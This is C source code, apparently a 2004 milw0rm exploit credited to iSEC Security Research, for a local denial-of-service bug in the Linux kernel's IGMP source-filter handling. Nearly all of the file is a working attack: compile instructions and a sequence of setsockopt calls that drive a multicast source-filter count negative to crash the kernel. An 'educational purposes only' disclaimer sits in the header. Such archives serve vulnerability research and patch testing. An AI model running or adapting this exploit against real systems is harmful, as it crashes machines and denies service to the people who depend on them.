/*
* Linux igmp.c local DoS
* Warning: this code will crash your machine!
*
* gcc -O2 mreqfck.c -o mreqfck
*
* Copyright (c) 2004  iSEC Security Research. All Rights Reserved.
*
* THIS PROGRAM IS FOR EDUCATIONAL PURPOSES *ONLY* IT IS PROVIDED "AS IS"
* AND WITHOUT ANY WARRANTY. COPYING, PRINTING, DISTRIBUTION, MODIFICATION
* WITHOUT PERMISSION OF THE AUTHOR IS STRICTLY PROHIBITED.
*
*/

#include <stdio.h>
#include <unistd.h>
#include <errno.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <linux/types.h>

#define MCAST_INCLUDE                   1
#define IP_MSFILTER                     41

#define IP_UNBLOCK_SOURCE               37
#define IP_BLOCK_SOURCE                 38

struct ip_msfilter
{
   __u32 imsf_multiaddr;
   __u32 imsf_interface;
   __u32 imsf_fmode;
   __u32 imsf_numsrc;
   __u32 imsf_slist[1];
};

struct ip_mreq_source
{
   __u32 imr_multiaddr;
   __u32 imr_interface;
   __u32 imr_sourceaddr;
};

void
fatal (const char *message)
{
   printf ("\n");
   if (!errno)
     {
         fprintf (stdout, "FATAL: %s\n", message);
     }
   else
     {
         fprintf (stdout, "FATAL: %s (%s) ", message,
                  (char *) (strerror (errno)));
     }
   printf ("\n");
   fflush (stdout);
   exit (1);
}

int
main ()
{
   int s, r, l;
   struct ip_mreqn mr;
   struct ip_msfilter msf;
   struct ip_mreq_source ms;
   in_addr_t a1, a2;

   s = socket (AF_INET, SOCK_DGRAM, 0);
   if (s < 0)
       fatal ("socket");

//      first join mcast group
   memset (&mr, 0, sizeof (mr));
   mr.imr_multiaddr.s_addr = inet_addr ("224.0.0.199");
   l = sizeof (mr);
   r = setsockopt (s, SOL_IP, IP_ADD_MEMBERSHIP, &mr, l);
   if (r < 0)
       fatal ("setsockopt");

//      add source filter count=1
   memset (&ms, 0, sizeof (ms));
   ms.imr_multiaddr = inet_addr ("224.0.0.199");
   ms.imr_sourceaddr = inet_addr ("4.5.6.7");
   l = sizeof (ms);
   r = setsockopt (s, SOL_IP, IP_BLOCK_SOURCE, &ms, l);
   if (r < 0)
       fatal ("setsockopt2");

//      del source filter count = 0
//      imr_multiaddr & imr_interface must correspond to ADD
   memset (&ms, 0, sizeof (ms));
   ms.imr_multiaddr = inet_addr ("224.0.0.199");
   ms.imr_sourceaddr = inet_addr ("4.5.6.7");
   l = sizeof (ms);
   r = setsockopt (s, SOL_IP, IP_UNBLOCK_SOURCE, &ms, l);
   if (r < 0)
       fatal ("setsockopt2");

//      del again, count = -1
   memset (&ms, 0, sizeof (ms));
   ms.imr_multiaddr = inet_addr ("224.0.0.199");
   ms.imr_sourceaddr = inet_addr ("4.5.6.7");
   l = sizeof (ms);
   r = setsockopt (s, SOL_IP, IP_UNBLOCK_SOURCE, &ms, l);
   if (r < 0)
       fatal ("setsockopt3");

//      crash
   memset (&ms, 0, sizeof (ms));
   ms.imr_multiaddr = inet_addr ("224.0.0.199");
   ms.imr_sourceaddr = inet_addr ("4.5.6.7");
   l = sizeof (ms);
   r = setsockopt (s, SOL_IP, IP_UNBLOCK_SOURCE, &ms, l);
   if (r < 0)
       fatal ("setsockopt4");

   getchar ();

   return 0;
}

// milw0rm.com [2004-12-14]